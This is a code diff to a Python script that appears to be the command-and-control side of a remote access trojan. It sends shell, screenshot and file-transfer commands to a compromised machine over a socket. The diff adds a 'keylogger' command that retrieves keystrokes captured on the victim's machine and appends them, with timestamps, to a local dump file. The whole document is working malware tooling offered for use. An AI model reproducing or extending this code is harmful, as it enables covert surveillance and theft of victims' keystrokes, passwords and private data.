@@ -2,6 +2,11 @@
 import base64
 import socket
 import json
+from datetime import datetime
+
+s = None
+target = None
+ip = None
 
 
 def shell():
@@ -31,6 +36,8 @@ def shell():
         elif cmd.startswith("screenshot"):
             reliable_send(cmd)
             download("capture.png")
+        elif cmd.startswith("keylogger"):
+            keylogger(cmd)
         else:
             reliable_send(cmd)
             print(reliable_recv())
@@ -95,6 +102,24 @@ def upload(filename):
             # convert to string
             string = b64.decode()
             reliable_send(string)
+            print(reliable_recv())
+    except Exception as e:
+        print(e)
+
+
+def keylogger(cmd):
+    try:
+        c = cmd[10:]
+        if c.startswith("dump"):
+            reliable_send(cmd)
+            keylogs = reliable_recv()
+            with open("keylogdump.txt", "a") as file:
+                now = datetime.now()
+                file.write("\n----------- Log date: " + str(now) + "-----------\n")
+                file.write(keylogs)
+                file.close()
+        else:
+            reliable_send(cmd)
             print(reliable_recv())
     except Exception as e:
         print(e)
